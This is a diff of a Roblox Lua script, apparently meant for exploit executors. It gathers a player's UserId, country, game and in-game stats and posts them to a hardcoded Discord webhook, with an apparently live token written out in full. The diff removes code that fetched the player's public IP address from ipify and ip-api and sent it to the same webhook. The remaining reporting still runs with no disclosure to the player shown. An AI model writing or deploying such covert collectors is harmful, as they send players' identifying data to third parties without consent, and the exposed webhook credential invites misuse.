@@ -1,24 +1,18 @@
-local HttpService = game:GetService("HttpService")
+    local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local LocalizationService = game:GetService("LocalizationService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
 
 local player = Players.LocalPlayer
 local webhook = "https://discord.com/api/webhooks/1479815655355187229/JrRe1aeWZp9WOw4t6Qk9DhCPfebK1S7nIcRcf3gy1jVs3Jhc5lRdCw4UK6YPCZixAEf9"
 
 local request = syn and syn.request or http_request or request or fluxus and fluxus.request
 
-local countryCode = "Unknown"
-pcall(function()
-    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(player)
-end)
+local startTime = os.date("%Y-%m-%d %H:%M:%S")
 
 local country = "Unknown"
 pcall(function()
-    local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-    if data and data.country then
-        country = data.country
-    end
+    country = LocalizationService:GetCountryRegionForPlayerAsync(player)
 end)
 
 local strength = "Unknown"
@@ -51,11 +45,6 @@ pcall(function()
     end
 end)
 
-local ip = "Unknown"
-pcall(function()
-    ip = game:HttpGet("https://api.ipify.org")
-end)
-
 local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
 local data = {
@@ -67,12 +56,12 @@ local data = {
             {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
             {["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
             {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+            {["name"] = "⏱ Time", ["value"] = startTime, ["inline"] = true},
             {["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
             {["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
             {["name"] = "💎 Gems", ["value"] = tostring(gems), ["inline"] = true},
             {["name"] = "👟 Steps", ["value"] = tostring(steps), ["inline"] = true},
-            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
-            {["name"] = "🌐 IP Address", ["value"] = ip, ["inline"] = false}
+            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true}
         }
     }}
 }
